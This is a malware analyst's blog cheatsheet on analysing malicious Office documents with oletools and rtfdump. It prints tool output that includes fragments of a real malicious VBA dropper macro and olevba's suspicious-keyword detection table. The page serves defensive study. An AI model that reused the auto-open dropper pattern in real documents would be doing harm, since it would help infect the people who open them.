@@ -1,0 +1,613 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Malicious Document: Cheatsheet and Note" /><meta name="author" content="fareedfauzi" /><meta property="og:locale" content="en_US" /><meta name="description" content="My cheatsheet and note when countering Maldoc" /><meta property="og:description" content="My cheatsheet and note when countering Maldoc" /><link rel="canonical" href="https://fareedfauzi.github.io/posts/Maldoc-Cheatsheet/" /><meta property="og:url" content="https://fareedfauzi.github.io/posts/Maldoc-Cheatsheet/" /><meta property="og:site_name" content="~/FareedFauzi" /><meta property="og:image" content="https://fareedfauzi.github.io/" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-06T08:06:00+08:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://fareedfauzi.github.io/" /><meta property="twitter:title" content="Malicious Document: Cheatsheet and Note" /><meta name="twitter:site" content="@0xfareed" /><meta name="twitter:creator" content="@fareedfauzi" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"My cheatsheet and note when countering Maldoc","@type":"BlogPosting","url":"https://fareedfauzi.github.io/posts/Maldoc-Cheatsheet/","headline":"Malicious Document: Cheatsheet and Note","dateModified":"2021-01-06T08:06:00+08:00","datePublished":"2021-01-06T08:06:00+08:00","image":"https://fareedfauzi.github.io/","mainEntityOfPage":{"@type":"WebPage","@id":"https://fareedfauzi.github.io/posts/Maldoc-Cheatsheet/"},"author":{"@type":"Person","name":"fareedfauzi"},"@context":"https://schema.org"}</script><title>Malicious Document: Cheatsheet and Note | ~/FareedFauzi</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="https://raw.githubusercontent.com/fareedfauzi/fareedfauzi.github.io/master/assets/img/Profile/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">~/FareedFauzi</a></div><div class="site-subtitle font-italic">Just another cyber-security blog discussing about malware analysis, malware research and reverse engineering</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/fareedfauzi" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/0xfareed" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['fareedradzi','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Malicious Document: Cheatsheet and Note</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Malicious Document: Cheatsheet and Note</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Jan 6, 2021, 8:06 AM +0800" > Jan 6 <i class="unloaded">2021-01-06T08:06:00+08:00</i> </span> by <span class="author"> fareedfauzi </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="" class="post-preview-img"><h2 id="rtf">RTF</h2><p>RTF often comes with exploits targetting Microsoft Word vulnerabilities. Always look for embedded objects and anomalous content in the RTF.</p><p>Be prepared to locate, extract and analyze shellcode.</p><ul><li>Emulate using scdbg OR<li>Execute using jmp2it OR<li>Convert to executable and debug the executable using x32dbg<ul><li>Find the start offset of the shellcode</ul><li>Behavioral analysis</ul><p>RTF exploit list:</p><ul><li>CVE-2018-8570<li>CVE-2018-0802<li>CVE-2017-11882<li>CVE-2017-0199<li>CVE-2015-1641<li>CVE-2014-1761<li>CVE-2012-0158</ul><p>Use <strong>rtfobj</strong> to inspect and extract embedded objects from RTF files.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ rtfobj malicious.rtf
+rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+===============================================================================
+File: 'malicious.rtf' - size: 401748 bytes
+---+----------+---------------------------------------------------------------
+id |index     |OLE Object                                                     
+---+----------+---------------------------------------------------------------
+0  |0001076Ah |format_id: 2 (Embedded)                                        
+   |          |class name: b'Package'                                         
+   |          |data size: 159944                                              
+   |          |OLE Package object:                                            
+   |          |Filename: '8.t'                                                
+   |          |Source path: 'C:\\Aaa\\tmp\\8.t'                               
+   |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'   
+   |          |MD5 = '9bffe424e9b7be9e1461a3218923e110'                       
+---+----------+---------------------------------------------------------------
+1  |0005E98Ah |format_id: 2 (Embedded)                                        
+   |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'             
+   |          |data size: 6436                                                
+   |          |MD5 = 'a09e82c26f94f3a9297377120503a678'                       
+---+----------+---------------------------------------------------------------
+2  |0005E970h |Not a well-formed OLE object                                   
+---+----------+---------------------------------------------------------------
+</pre></table></code></div></div><p>To dump specific OLE Object:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ rtfobj malicious.rtf -s 2
+rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/oletools/issues
+
+
+===============================================================================
+File: 'malicious.rtf' - size: 401748 bytes
+---+----------+---------------------------------------------------------------
+id |index     |OLE Object                                                     
+---+----------+---------------------------------------------------------------
+0  |0001076Ah |format_id: 2 (Embedded)                                        
+   |          |class name: b'Package'                                         
+   |          |data size: 159944                                              
+   |          |OLE Package object:                                            
+   |          |Filename: '8.t'                                                
+   |          |Source path: 'C:\\Aaa\\tmp\\8.t'                               
+   |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'   
+   |          |MD5 = '9bffe424e9b7be9e1461a3218923e110'                       
+---+----------+---------------------------------------------------------------
+1  |0005E98Ah |format_id: 2 (Embedded)                                        
+   |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'             
+   |          |data size: 6436                                                
+   |          |MD5 = 'a09e82c26f94f3a9297377120503a678'                       
+---+----------+---------------------------------------------------------------
+2  |0005E970h |Not a well-formed OLE object                                   
+---+----------+---------------------------------------------------------------
+Saving raw data in object #0:
+  saving object to file malicious.rtf_object_0005E970.raw
+  md5 a3540560cf9b92c3bc4aa0ed52767b
+</pre></table></code></div></div><p>Alternatively, use rtfdump.py to analyze RTF. Below command list groups and structure of RTF.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ rtfdump.py mal.rtf 
+    1 Level  1        c=  124 p=00000000 l=  401423 h=  349186;  319968 b=       0   u=    5079 \rtf1
+    2  Level  2       c=  115 p=000000b7 l=    8126 h=     950;      20 b=       0   u=    1383 \fonttbl
+    3   Level  3      c=    1 p=000000c0 l=      82 h=      23;      20 b=       0   u=      11 \f0
+    4    Level  4     c=    0 p=000000e2 l=      31 h=      20;      20 b=       0   u=       0 \*\panose
+    5   Level  3      c=    1 p=00000113 l=      72 h=      22;      20 b=       0   u=       4 \f1
+&lt;---snip---&gt;
+  330  Level  2       c=    0 p=0000fab5 l=    3226 h=    3184;     252 b=       0 O u=       0 \*\datastore
+      Name: 'Msxml2.SAXXMLReader.6.0\x00' Size: 1536 md5: 07ea196e1a0674f7ce220b6ae8c61cb7 magic: d0cf11e0
+  331  Level  2       c=    2 p=00010750 l=  320007 h=  319968;  319968 b=       0 O u=       0 \object
+      Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
+  332   Level  3      c=    0 p=0001075f l=  319980 h=  319968;  319968 b=       0 O u=       0 \*\objdata
+      Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
+  333   Level  3      c=    0 p=0005e94c l=      10 h=       0;       0 b=       0   u=       0 \result
+  334  Level  2       c=    1 p=0005e958 l=   14006 h=   13415;   13407 b=       0   u=       1 \object
+  335   Level  3      c=    1 p=0005e967 l=   13979 h=   13415;   13407 b=       0   u=       0 \objdata
+  336    Level  4     c=    1 p=0005e97f l=   13954 h=   13407;   13407 b=       0   u=       0 \*\objdata
+  337     Level  5    c=    0 p=0005e98b l=     534 h=     279;     279 b=       0   u=       0 \ods0000000000000000000000000000000000000000000010034533010342038422221556620832358404453773117665770487510150778730755613138068475808657687162582054482186656468762876881030061344325218221648318281400000000000000000000000000000000000000000000000000000000
+  338 Remainder       c=    0 p=00062010 l=     324 h=       0;       0 b=       0   u=     324 
+      Only NULL bytes = 324
+</pre></table></code></div></div><p>To reduce the output but filtering for the entries that potentially contain the embedded objects, we can use-f O.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ rtfdump.py mal.rtf -f O
+  330  Level  2       c=    0 p=0000fab5 l=    3226 h=    3184;     252 b=       0 O u=       0 \*\datastore
+      Name: 'Msxml2.SAXXMLReader.6.0\x00' Size: 1536 md5: 07ea196e1a0674f7ce220b6ae8c61cb7 magic: d0cf11e0
+  331  Level  2       c=    2 p=00010750 l=  320007 h=  319968;  319968 b=       0 O u=       0 \object
+      Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
+  332   Level  3      c=    0 p=0001075f l=  319980 h=  319968;  319968 b=       0 O u=       0 \*\objdata
+      Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
+</pre></table></code></div></div><p>To dump specific group:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>rtfdump.py mal.rtf -s 330 -H -d &gt; output.bin
+</pre></table></code></div></div><p>If you’re likely encountring RoyalRoad RTF, picture below show Royal Road exploit kit version pattern:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://nao-sec.org/assets/2020-01-30/version.png" alt="enter image description here" /> Source: <a href="https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html">An Overhead View of the Royal Road | @nao_sec (nao-sec.org)</a></p><p>Also, we can use YARA rules made by NaoSec for RoyalRoad: <a href="https://github.com/nao-sec/yara_rules">RoyalRoad YARA rules</a></p><h2 id="rtf-template-injection">RTF template injection</h2><p>Search for control word <code class="language-plaintext highlighter-rouge">\*\template</code>. Most attacker will serve the RTF template in this control word. For example:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="https://user-images.githubusercontent.com/56353946/123367279-442fb300-d5ac-11eb-9794-bb39c8ac0232.png" alt="image" /></p><h2 id="cve-2021-40444">CVE 2021 40444</h2><p>Initial assesment is to check <code class="language-plaintext highlighter-rouge">\word\_rels\document.xml.rels</code></p><h2 id="docx-template-injection">DOCX Template injection</h2><p>Reside in <code class="language-plaintext highlighter-rouge">word/_rels/settings.xml.rels</code></p><h2 id="macro-attack">Macro attack</h2><p>Use <strong>oledump</strong> to analyze and extract OLE files</p><p><code class="language-plaintext highlighter-rouge">oledump.py filename.doc</code> = Generally analyze streams that contain macro</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ oledump.py macro-sample.xls 
+  1:       107 '\x01CompObj'
+  2:       244 '\x05DocumentSummaryInformation'
+  3:       200 '\x05SummaryInformation'
+  4:     14882 'Workbook'
+  5:       740 '_VBA_PROJECT_CUR/PROJECT'
+  6:       182 '_VBA_PROJECT_CUR/PROJECTwm'
+  7:        97 '_VBA_PROJECT_CUR/UserForm1/\x01CompObj'
+  8:       293 '_VBA_PROJECT_CUR/UserForm1/\x03VBFrame'
+  9:       187 '_VBA_PROJECT_CUR/UserForm1/f'
+ 10:    443812 '_VBA_PROJECT_CUR/UserForm1/o'
+ 11: M    2423 '_VBA_PROJECT_CUR/VBA/Module1'
+ 12: M    3251 '_VBA_PROJECT_CUR/VBA/Module2'
+ 13: m     977 '_VBA_PROJECT_CUR/VBA/Sheet1'
+ 14: m     977 '_VBA_PROJECT_CUR/VBA/Sheet2'
+ 15: m     977 '_VBA_PROJECT_CUR/VBA/Sheet3'
+ 16: M    1275 '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
+ 17: M    1907 '_VBA_PROJECT_CUR/VBA/UserForm1'
+ 18:      4402 '_VBA_PROJECT_CUR/VBA/_VBA_PROJECT'
+ 19:       926 '_VBA_PROJECT_CUR/VBA/dir'
+</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">oledump.py filename.xls -s 11 -v</code> = Extract macro for the stream 11 for example</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ oledump.py macro-sample.xls -s 16 -v
+Attribute VB_Name = "ThisWorkbook"
+Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = False
+Attribute VB_Customizable = True
+Private Sub Workbook_Open()
+  Call userAldiLoadr
+  Sheet3.Visible = xlSheetVisible
+ Sheet3.Copy
+ End Sub
+</pre></table></code></div></div><p>Use <strong>olevba3</strong> to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to extract VBA Macro code in clear text, deobfuscate and analyze malicious macros</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ olevba3 macro-sample.xls
+olevba 0.55.1 on Python 3.6.9 - http://decalage.info/python/oletools
+===============================================================================
+FILE: macro-sample.xls
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls 
+in file: macro-sample.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Workbook_Open()
+  Call userAldiLoadr
+  Sheet3.Visible = xlSheetVisible
+ Sheet3.Copy
+ End Sub
+&lt;---snip---&gt;
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
+|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Environ             |May read system environment variables        |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Write               |May write to a file (if combined with Open)  |
+|Suspicious|Put                 |May write to a file (if combined with Open)  |
+|Suspicious|Binary              |May read or write a binary file (if combined |
+|          |                    |with Open)                                   |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|vbNormalNoFocus     |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|MkDir               |May create a directory                       |
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|Shell.Application   |May run an application (if combined with     |
+|          |                    |CreateObject)                                |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+
+</pre></table></code></div></div><p><strong>mraptor</strong> is a tool designed to detect most malicious VBA Macros using generic heuristics.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ mraptor -m macro-sample.xls 
+MacroRaptor 0.55 - http://decalage.info/python/oletools
+This is work in progress, please report issues at https://github.com/decalage2/oletools/issues
+----------+-----+----+--------------------------------------------------------
+Result    |Flags|Type|File                                                    
+----------+-----+----+--------------------------------------------------------
+SUSPICIOUS|AWX  |OLE:|macro-sample.xls                                        
+          |     |    |Matches: ['Workbook_Open', 'MkDir', 'CreateObject']     
+
+Flags: A=AutoExec, W=Write, X=Execute
+Exit code: 20 - SUSPICIOUS
+</pre></table></code></div></div><p>Use <strong>ViperMonkey</strong> to emulate the VBA. Vmonkey is a VBA Emulation engine written in Python, designed to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+</pre><td class="rouge-code"><pre>remnux@remnux:~/Desktop$ vmonkey macro-sample.xls
+     _    ___                 __  ___            __             
+| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
+| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
+| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,&lt; /  __/ /_/ / 
+|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
+     /_/                                           /____/   
+vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
+THIS IS WORK IN PROGRESS - Check updates regularly!
+Please report any issue at https://github.com/decalage2/ViperMonkey/issues
+
+===============================================================================
+FILE: macro-sample.xls
+INFO     Starting emulation...
+INFO     Emulating an Office (VBA) file.
+INFO     Reading document metadata...
+Traceback (most recent call last):
+  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py", line 15, in &lt;module&gt;
+    from unotools import Socket, connect
+ModuleNotFoundError: No module named 'unotools'
+ERROR    Running export_all_excel_sheets.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py', '/tmp/tmp_excel_file_3189461446']' returned non-zero exit status 1
+INFO     Saving dropped analysis artifacts in .//macro-sample.xls_artifacts/
+INFO     Parsing VB...
+Error: [Errno 2] No such file or directory: ''.
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook.cls 
+in file:  - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+Private Sub Workbook_Open()
+  Call userAldiLoadr
+  Sheet3.Visible = xlSheetVisible
+ Sheet3.Copy
+ End Sub
+
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+INFO     parsed Sub Workbook_Open (): 3 statement(s)
+&lt;---snip---&gt;
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+INFO     parsed Sub Mace5 (): 2 statement(s)
+INFO     parsed Sub Maceo8 (): 2 statement(s)
+INFO     parsed Sub unAldizip ([ByRef Fname as Variant, ByRef FileNameFolder as Variant]): 4 statement(s)
+-------------------------------------------------------------------------------
+VBA MACRO Module2.bas 
+in file:  - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+Sub userAldiLoadr()
+
+    Dim path_Aldi_file As String
+    Dim file_Aldi_name  As String
+    Dim zip_Aldi_file  As Variant
+    Dim fldr_Aldi_name  As Variant
+    
+    Dim byt() As Byte
+    
+    Dim ar1Aldi() As String
+    
+    file_Aldi_name = "dhrwarhsav"
+    
+    fldr_Aldi_name = Environ$("ALLUSERSPROFILE") &amp; "\Edlacar\"
+</pre></table></code></div></div><h2 id="vba-stomping-if-macro-was-destroyed">VBA stomping (if macro was destroyed)</h2><p>Use pcodedmp to disassemble p-code macro code from filename.doc</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
